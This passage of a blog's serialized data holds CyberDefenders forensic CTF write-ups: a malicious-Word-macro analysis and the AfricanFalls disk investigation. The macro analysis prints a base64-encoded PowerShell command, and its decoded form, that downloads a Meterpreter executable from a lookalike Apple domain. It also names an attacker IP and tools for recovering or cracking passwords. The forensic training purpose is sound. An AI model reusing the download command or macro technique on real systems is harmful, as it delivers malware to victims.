Provide the number of the highest stream.</p>\n</blockquote>\n<p>The victim download the word document file. You can find it on  <code>Semah\\Downloads</code>  folder<br>\nLet’s export it from FTK imager and use  <code>oledump</code>  to check the streams in the document<br>\nWe find  <code>Macros/VBA/iphoneevil</code>  the highest stream</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       </span><br><span class=\"line\">  1:       114 <span class=\"string\">&#x27;\\x01CompObj&#x27;</span></span><br><span class=\"line\">  2:      4096 <span class=\"string\">&#x27;\\x05DocumentSummaryInformation&#x27;</span></span><br><span class=\"line\">  3:      4096 <span class=\"string\">&#x27;\\x05SummaryInformation&#x27;</span></span><br><span class=\"line\">  4:      8473 <span class=\"string\">&#x27;1Table&#x27;</span></span><br><span class=\"line\">  5:       501 <span class=\"string\">&#x27;Macros/PROJECT&#x27;</span></span><br><span class=\"line\">  6:        68 <span class=\"string\">&#x27;Macros/PROJECTwm&#x27;</span></span><br><span class=\"line\">  7:      3109 <span class=\"string\">&#x27;Macros/VBA/_VBA_PROJECT&#x27;</span></span><br><span class=\"line\">  8:       800 <span class=\"string\">&#x27;Macros/VBA/dir&#x27;</span></span><br><span class=\"line\">  9: M    1170 <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\"> 10: M    5581 <span class=\"string\">&#x27;Macros/VBA/iphoneevil&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Answer: 10</p>\n<p>Let’s do some analysis on the macro and the malicious document using the  <code>oletools</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf</span><br><span class=\"line\">olevba IPhone-Winners.doc --deobf                                                                                 ─╯</span><br><span class=\"line\">XLMMacroDeobfuscator: pywin32 is not installed (only is required <span class=\"keyword\">if</span> you want to use MS Excel)</span><br><span class=\"line\">olevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools</span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">FILE: IPhone-Winners.doc</span><br><span class=\"line\">Type: OLE</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">VBA MACRO eviliphone.cls</span><br><span class=\"line\"><span class=\"keyword\">in</span> file: IPhone-Winners.doc - OLE stream: <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>\n<p>Scrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded<br>\nٍ<img data-src=\"https://imgur.com/bvrf9oR.png\" alt=\"\"><br>\nOK let’s decode it and check what the attacker want to do !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s:~$ <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA&quot;</span> | <span class=\"built_in\">base64</span> -d</span><br><span class=\"line\"></span><br><span class=\"line\">invoke-webrequest -Uri <span class=\"string\">&#x27;http://appIe.com/Iphone.exe&#x27;</span> -OutFile <span class=\"string\">&#x27;C:\\Temp\\IPhone.exe&#x27;</span> -UseDefaultCredentials</span><br></pre></td></tr></table></figure>\n<p>Wow! The macro try to run an obfuscated  <code>powershell</code>  command that download an executable from  <code>http://appIe.com/Iphone.exe</code>  and save it as   <code>C:\\Temp\\IPhone.exe</code></p>\n<blockquote>\n<p>5- The macro executed a program. Provide the program name?</p>\n</blockquote>\n<p>Answer: Powershell</p>\n<blockquote>\n<p>6- The macro downloaded a malicious file. Provide the full download URL.</p>\n</blockquote>\n<p>Answer: <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JcGhvbmUuZXhl\">http://appIe.com/Iphone.exe</span></p>\n<blockquote>\n<p>7- Where was the malicious file downloaded to? (Provide the full path)</p>\n</blockquote>\n<p>Answer:  C:\\Temp\\IPhone.exe</p>\n<blockquote>\n<p>8- What is the name of the framework used to create the malware?</p>\n</blockquote>\n<p>I am sure that Metasploit is the framework. But let’s make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love  <code>virustotal</code> <br>\n<img data-src=\"https://imgur.com/BKPJ37M.png\" alt=\"\"></p>\n<p>Just google  <code>Meterpreter</code>  and you’ll find that Meterpreter is a Metasploit attack payload that provides an interactive shell</p>\n<p>Ok dude don’t search ! go to  <code>COMMUNITY</code>  tab in  <code>virustotal</code>  and you’ll find comments. You’ll find a metasploit payload detected !</p>\n<p><img data-src=\"https://imgur.com/xuOEWiC.png\" alt=\"\"></p>\n<p>Answer: Metasploit</p>\n<blockquote>\n<p>9- What is the attacker’s IP address?</p>\n</blockquote>\n<p>OK! Now we know that the malicious document download a binary! Of course this binary is a malware.<br>\nWe need to know what is the attacker’s IP address. So let’s do some dynamic analysis. We can do it using either  <code>any.run</code>  or  <code>hybrid-analysis</code> . I will use it both of them just for fun !! Just upload the binary  <code>IPhone.exe</code>  and check the connections !</p>\n<p>ٍ<img data-src=\"https://imgur.com/w04BlMl.png\" alt=\"\" title=\"Using app.run.any\"><br>\nٍ<img data-src=\"https://imgur.com/wNJKnce.png\" alt=\"\" title=\"Using HYBRID ANALYSIS\"></p>\n<p>Answer: 155.94.69.27</p>\n<blockquote>\n<p>10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?</p>\n</blockquote>\n<p>We find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in  <code>AppData\\Roaming\\Mozilla\\Firefox\\</code> . We can inspect it using SQLite Browser.<br>\nThe most important db file is  <code>places.sqlite</code> . Inspect it and open the  <code>moz_places</code>  database table and check the history of the victim !<br>\n<img data-src=\"https://imgur.com/qbtAcRf.png\" alt=\"\"></p>\n<p>Answer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbXBldGl0aW9ucy5jb20vbG9naW4ucGhw\">http://appIe.competitions.com/login.php</span></p>\n<blockquote>\n<p>11- What is the password the user submitted to the login page?</p>\n</blockquote>\n<p>There is a tool called  <code>Password Fox</code>  that will resolve our problem here !<br>\nPasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.<br>\nDownload it from <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvcGFzc3dvcmRmb3guaHRtbA==\">here</span></p>\n<p><img data-src=\"https://imgur.com/pM1lfwD.png\" alt=\"\" title=\"Here is the password\"></p>\n<p>Answer: GacsriicUZMY4xiAF4yl</p>\n"},{"title":"CyberDefenders Writeup AfricanFalls","date":"2022-09-08T23:20:27.000Z","cover":"https://cyberdefenders.org/media/terraform/AfricanFalls/a2.png","_content":"\nThis CTF challenge is from AfricaFalls Digital Forensics contest , We have disk image that have a lot of information like password, registries, browser history etc...\nWe will investigate some useful informations! Be ready \n\n# Challenge Information \n\n\n+++info Description\n\nJohn Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task is to analyze the image and understand what happened under the hood.\n\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/66\n  desc: CyberDefenders - Brave \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - DFIRScience\n  desc: DFIRScience Twitter Profile\n  url: https://twitter.com/DFIRScience\n  image: https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\n  color: \"#fcc11c\"\n\n{% endlinks %}\n\n# Walkthrough\n\n\n> 1- What is the MD5 hash value of the suspect disk?\n\nJust inspec the `ad1.txt` and you'll find useful information about the disk image like the acquisition time and the checksum\n\n```bash command line prompt \ncat DiskDrigger.ad1.txt \nCreated By AccessData® FTK® Imager 4.5.0.3\n\nCase Information:\nAcquired using: ADI4.5.0.3\n...\n[Computed Hashes]\n MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1\n SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a\n\nImage information:\n Acquisition started:   Tue Jun 15 12:28:20 2021\n Acquisition finished:  Tue Jun 15 12:33:10 2021\n Segment list:\n  D:\\Users\\Mawso3a\\Desktop\\DiskDrigger.ad1\n\nImage Verification Results:\n Verification started:  Tue Jun 15 12:33:18 2021\n Verification finished: Tue Jun 15 12:33:51 2021\n MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1 : verified\n SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a : verified\n```\n\n:::success\nAnswer: 9471e69c95d8909ae60ddff30d50ffa1\n:::\n\n> 2- What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between)\nWe found that the user used a chrome as his main browser! So we decide to get the database that contains the history of browsing. We can inspect it with DB Browser SQLite\n![](https://imgur.com/YdY9w1L.png)\nAfter Opening the database you can search about the history and find the correct answer using the right timestamp\n\n![](https://imgur.com/jL9EEDB.png)\n\n:::success\nAnswer:  password cracking lists\n:::\n\n> 3- What is the IPv4 address of the FTP server the suspect connected to?\n\nWait man! FileZilla is installed in our system. I am sure that we will find the information in `filezilla.xml`\n\n![](https://imgur.com/uOJpYIM.png)\n\n:::success\nAnswer:  192.168.1.20\n:::\n\n> 4- What date and time was a password list deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC)\n\nThis is EASY DUDE! just check the Recycle Bin ! You'll find your target ! \n![](https://imgur.com/TuEyvM2.png)\n\n:::success\nAnswer:  2021-04-29 18:22:17 UTC\n:::\n\n> 5- How many times was Tor Browser ran on the suspect's computer? (number only)\n\nI guess this question is tricky! where is tor man !!! OK calm down you'll find `lnk` file about tor but i think it's fake one ! Let's try an LNK Parser. I'll use `ericzimmerman` tool ! \n\n![](https://imgur.com/GelvVNQ.png)\n\nWow firefox.exe in TOR LNK file! This is Joke \n\n:::success\nAnswer:  0\n:::\n> 6- What is the suspect's email address?\n\nOK backing again to the browser history to check if the user visit a mailing website !\n![](https://imgur.com/BmHa8m2.png)\n\n:::success\nAnswer:   dreammaker82@protonmail.com\n:::\n\n> 7- What is the FQDN did the suspect port scan?\n\nHe asked about port scan?? mmm I guess nmap is here ! Nmap are you here ? \n![](https://imgur.com/UMN9Zbr.png \"NMAP: YES I AM HERE !\")\n\nJust i checked the PowerShell history. You'll find it in `AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine`\n\n![](https://imgur.com/OwOcsXB.png)\n\n:::success\nAnswer:  dfir.science\n:::\n\n> 8- What country was picture \"20210429_152043.jpg\" allegedly taken in?\n\nI tried to inspect the metadata of the image and i found GPS position information! \n```bash command line prompt\nexiftool 20210429_152043.jpg\n....\n....\nGPS Latitude                    : 16 deg 0' 0.00\" S\nGPS Longitude                   : 23 deg 0' 0.00\" E\nFocal Length                    : 3.7 mm\nGPS Position                    : 16 deg 0' 0.00\" S, 23 deg 0' 0.00\" E\nLight Value                     : 13.7\n```\nOk let's try to find the country using GPS Coordinates Finder\n\n![](https://imgur.com/freR9Vd.png)\n\n:::success\nAnswer:  Zambia\n:::\n\n> 9- What is the parent folder name picture \"20210429_151535.jpg\" was in before the suspect copy it to \"contact\" folder on his desktop?\n\nShellbags explorer will solve our problem here! But wait man ! What are ShellBag artifacts?\n`ShellBags` are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices. ShellBags are stored as a highly nested and hierarchal set of subkeys in the UsrClass\nThis registyr hive will save us : `[root]\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\Usrclass.dat`\n\nٍ![](https://imgur.com/IAJ0GBZ.png)\n\n:::success\nAnswer:  Camera\n:::\n\n> 10- A Windows password hashes for an account are below. What is the user's password?\n\nJust try an online hash cracker \n\nٍ![](https://imgur.com/eQ1U5w7.png)\n\n:::success\nAnswer:   AFR1CA!\n:::\n\n\n\n","source":"_posts/CyberDefenders/affrica-falls.md","raw":"---\ntitle: CyberDefenders Writeup AfricanFalls\ndate: 2022-09-9 00:20:27\n\ntags:\ncover: https://cyberdefenders.org/media/terraform/AfricanFalls/a2.png\ncategories:\n- [CyberDefenders]\n---\n\nThis CTF challenge is from AfricaFalls Digital Forensics contest , We have disk image that have a lot of information like password, registries, browser history etc...\nWe will investigate some useful informations! Be ready \n\n# Challenge Information \n\n\n+++info Description\n\nJohn Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task is to analyze the image and understand what happened under the hood.\n\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://cyberdefenders.org/blueteam-ctf-challenges/66\n  desc: CyberDefenders - Brave \n  image: https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\n  color: \"#2296fd\"\n- site: Author - DFIRScience\n  desc: DFIRScience Twitter Profile\n  url: https://twitter.com/DFIRScience\n  image: https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\n  color: \"#fcc11c\"\n\n{% endlinks %}\n\n# Walkthrough\n\n\n> 1- What is the MD5 hash value of the suspect disk?\n\nJust inspec the `ad1.txt` and you'll find useful information about the disk image like the acquisition time and the checksum\n\n```bash command line prompt \ncat DiskDrigger.ad1.txt \nCreated By AccessData® FTK® Imager 4.5.0.3\n\nCase Information:\nAcquired using: ADI4.5.0.3\n...\n[Computed Hashes]\n MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1\n SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a\n\nImage information:\n Acquisition started:   Tue Jun 15 12:28:20 2021\n Acquisition finished:  Tue Jun 15 12:33:10 2021\n Segment list:\n  D:\\Users\\Mawso3a\\Desktop\\DiskDrigger.ad1\n\nImage Verification Results:\n Verification started:  Tue Jun 15 12:33:18 2021\n Verification finished: Tue Jun 15 12:33:51 2021\n MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1 : verified\n SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a : verified\n```\n\n:::success\nAnswer: 9471e69c95d8909ae60ddff30d50ffa1\n:::\n\n> 2- What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between)\nWe found that the user used a chrome as his main browser! So we decide to get the database that contains the history of browsing. We can inspect it with DB Browser SQLite\n![](https://imgur.com/YdY9w1L.png)\nAfter Opening the database you can search about the history and find the correct answer using the right timestamp\n\n![](https://imgur.com/jL9EEDB.png)\n\n:::success\nAnswer:  password cracking lists\n:::\n\n> 3- What is the IPv4 address of the FTP server the suspect connected to?\n\nWait man! FileZilla is installed in our system. I am sure that we will find the information in `filezilla.xml`\n\n![](https://imgur.com/uOJpYIM.png)\n\n:::success\nAnswer:  192.168.1.20\n:::\n\n> 4- What date and time was a password list deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC)\n\nThis is EASY DUDE! just check the Recycle Bin ! You'll find your target ! \n![](https://imgur.com/TuEyvM2.png)\n\n:::success\nAnswer:  2021-04-29 18:22:17 UTC\n:::\n\n> 5- How many times was Tor Browser ran on the suspect's computer? (number only)\n\nI guess this question is tricky! where is tor man !!! OK calm down you'll find `lnk` file about tor but i think it's fake one ! Let's try an LNK Parser. I'll use `ericzimmerman` tool ! \n\n![](https://imgur.com/GelvVNQ.png)\n\nWow firefox.exe in TOR LNK file! This is Joke \n\n:::success\nAnswer:  0\n:::\n> 6- What is the suspect's email address?\n\nOK backing again to the browser history to check if the user visit a mailing website !\n![](https://imgur.com/BmHa8m2.png)\n\n:::success\nAnswer:   dreammaker82@protonmail.com\n:::\n\n> 7- What is the FQDN did the suspect port scan?\n\nHe asked about port scan?? mmm I guess nmap is here ! Nmap are you here ? \n![](https://imgur.com/UMN9Zbr.png \"NMAP: YES I AM HERE !\")\n\nJust i checked the PowerShell history. You'll find it in `AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine`\n\n![](https://imgur.com/OwOcsXB.png)\n\n:::success\nAnswer:  dfir.science\n:::\n\n> 8- What country was picture \"20210429_152043.jpg\" allegedly taken in?\n\nI tried to inspect the metadata of the image and i found GPS position information! \n```bash command line prompt\nexiftool 20210429_152043.jpg\n....\n....\nGPS Latitude                    : 16 deg 0' 0.00\" S\nGPS Longitude                   : 23 deg 0' 0.00\" E\nFocal Length                    : 3.7 mm\nGPS Position                    : 16 deg 0' 0.00\" S, 23 deg 0' 0.00\" E\nLight Value                     : 13.7\n```\nOk let's try to find the country using GPS Coordinates Finder\n\n![](https://imgur.com/freR9Vd.png)\n\n:::success\nAnswer:  Zambia\n:::\n\n> 9- What is the parent folder name picture \"20210429_151535.jpg\" was in before the suspect copy it to \"contact\" folder on his desktop?\n\nShellbags explorer will solve our problem here! But wait man ! What are ShellBag artifacts?\n`ShellBags` are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices. ShellBags are stored as a highly nested and hierarchal set of subkeys in the UsrClass\nThis registyr hive will save us : `[root]\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\Usrclass.dat`\n\nٍ![](https://imgur.com/IAJ0GBZ.png)\n\n:::success\nAnswer:  Camera\n:::\n\n> 10- A Windows password hashes for an account are below. What is the user's password?\n\nJust try an online hash cracker \n\nٍ![](https://imgur.com/eQ1U5w7.png)\n\n:::success\nAnswer:   AFR1CA!\n:::\n\n\n\n","slug":"CyberDefenders/affrica-falls","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxnb0007d5qfeu0hao90","content":"<p>This CTF challenge is from AfricaFalls Digital Forensics contest , We have disk image that have a lot of information like password, registries, browser history etc…<br>\nWe will investigate some useful informations! Be ready</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>John Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task is to analyze the image and understand what happened under the hood.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<blockquote>\n<p>1- What is the MD5 hash value of the suspect disk?</p>\n</blockquote>\n<p>Just inspec the  <code>ad1.txt</code>  and you’ll find useful information about the disk image like the acquisition time and the checksum</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> DiskDrigger.ad1.txt </span><br><span class=\"line\">Created By AccessData® FTK® Imager 4.5.0.3</span><br><span class=\"line\"></span><br><span class=\"line\">Case Information:</span><br><span class=\"line\">Acquired using: ADI4.5.0.3</span><br><span class=\"line\">...</span><br><span class=\"line\">[Computed Hashes]</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a</span><br><span class=\"line\"></span><br><span class=\"line\">Image information:</span><br><span class=\"line\"> Acquisition started:   Tue Jun 15 12:28:20 2021</span><br><span class=\"line\"> Acquisition finished:  Tue Jun 15 12:33:10 2021</span><br><span class=\"line\"> Segment list:</span><br><span class=\"line\">  D:\\Users\\Mawso3a\\Desktop\\DiskDrigger.ad1</span><br><span class=\"line\"></span><br><span class=\"line\">Image Verification Results:</span><br><span class=\"line\"> Verification started:  Tue Jun 15 12:33:18 2021</span><br><span class=\"line\"> Verification finished: Tue Jun 15 12:33:51 2021</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1 : verified</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a : verified</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 9471e69c95d8909ae60ddff30d50ffa1</p>\n</div>\n<blockquote>\n<p>2- What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between)<br>\nWe found that the user used a chrome as his main browser! So we decide to get the database that contains the history of browsing. We can inspect it with DB Browser SQLite<br>\n<img data-src=\"https://imgur.com/YdY9w1L.png\" alt=\"\"><br>\nAfter Opening the database you can search about the history and find the correct answer using the right timestamp</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/jL9EEDB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  password cracking lists</p>\n</div>\n<blockquote>\n<p>3- What is the IPv4 address of the FTP server the suspect connected to?</p>\n</blockquote>\n<p>Wait man! FileZilla is installed in our system. I am sure that we will find the information in  <code>filezilla.xml</code></p>\n<p><img data-src=\"https://imgur.com/uOJpYIM.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  192.168.1.20</p>\n</div>\n<blockquote>\n<p>4- What date and time was a password list deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC)</p>\n</blockquote>\n<p>This is EASY DUDE! just check the Recycle Bin ! You’ll find your target !<br>\n<img data-src=\"https://imgur.com/TuEyvM2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  2021-04-29 18:22:17 UTC</p>\n</div>\n<blockquote>\n<p>5- How many times was Tor Browser ran on the suspect’s computer? (number only)</p>\n</blockquote>\n<p>I guess this question is tricky! where is tor man !!! OK calm down you’ll find  <code>lnk</code>  file about tor but i think it’s fake one ! Let’s try an LNK Parser. I’ll use  <code>ericzimmerman</code>  tool !</p>\n<p><img data-src=\"https://imgur.com/GelvVNQ.png\" alt=\"\"></p>\n<p>Wow firefox.exe in TOR LNK file! This is Joke</p>\n<div class=\"note success\">\n<p>Answer:  0</p>\n</div>\n<blockquote>\n<p>6- What is the suspect’s email address?</p>\n</blockquote>\n<p>OK backing again to the browser history to check if the user visit a mailing website !<br>\n<img data-src=\"https://imgur.com/BmHa8m2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   <span class=\"exturl\" data-url=\"bWFpbHRvOmRyZWFtbWFrZXI4MkBwcm90b25tYWlsLmNvbQ==\">dreammaker82@protonmail.com</span></p>\n</div>\n<blockquote>\n<p>7- What is the FQDN did the suspect port scan?</p>\n</blockquote>\n<p>He asked about port scan?? mmm I guess nmap is here ! Nmap are you here ?<br>\n<img data-src=\"https://imgur.com/UMN9Zbr.png\" alt=\"\" title=\"NMAP: YES I AM HERE !\"></p>\n<p>Just i checked the PowerShell history. You’ll find it in  <code>AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine</code></p>\n<p><img data-src=\"https://imgur.com/OwOcsXB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  dfir.science</p>\n</div>\n<blockquote>\n<p>8- What country was picture “20210429_152043.jpg” allegedly taken in?</p>\n</blockquote>\n<p>I tried to inspect the metadata of the image and i found GPS position information!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exiftool 20210429_152043.jpg</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">GPS Latitude                    : 16 deg 0<span class=\"string\">&#x27; 0.00&quot; S</span></span><br><span class=\"line\"><span class=\"string\">GPS Longitude                   : 23 deg 0&#x27;</span> 0.00<span class=\"string\">&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Focal Length                    : 3.7 mm</span></span><br><span class=\"line\"><span class=\"string\">GPS Position                    : 16 deg 0&#x27; 0.00&quot;</span> S, 23 deg 0<span class=\"string\">&#x27; 0.00&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Light Value                     : 13.7</span></span><br></pre></td></tr></table></figure>\n<p>Ok let’s try to find the country using GPS Coordinates Finder</p>\n<p><img data-src=\"https://imgur.com/freR9Vd.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Zambia</p>\n</div>\n<blockquote>\n<p>9- What is the parent folder name picture “20210429_151535.jpg” was in before the suspect copy it to “contact” folder on his desktop?</p>\n</blockquote>\n<p>Shellbags explorer will solve our problem here! But wait man ! What are ShellBag artifacts?<br>\n <code>ShellBags</code>  are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices. ShellBags are stored as a highly nested and hierarchal set of subkeys in the UsrClass<br>\nThis registyr hive will save us :  <code>[root]\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\Usrclass.dat</code></p>\n<p>ٍ<img data-src=\"https://imgur.com/IAJ0GBZ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Camera</p>\n</div>\n<blockquote>\n<p>10- A Windows password hashes for an account are below. What is the user’s password?</p>\n</blockquote>\n<p>Just try an online hash cracker</p>\n<p>ٍ<img data-src=\"https://imgur.com/eQ1U5w7.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   AFR1CA!</p>\n</div>\n","site":{"data":{}},"length":3587,"excerpt":"","more":"<p>This CTF challenge is from AfricaFalls Digital Forensics contest , We have disk image that have a lot of information like password, registries, browser history etc…<br>\nWe will investigate some useful informations! Be ready</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>John Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task is to analyze the image and understand what happened under the hood.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" 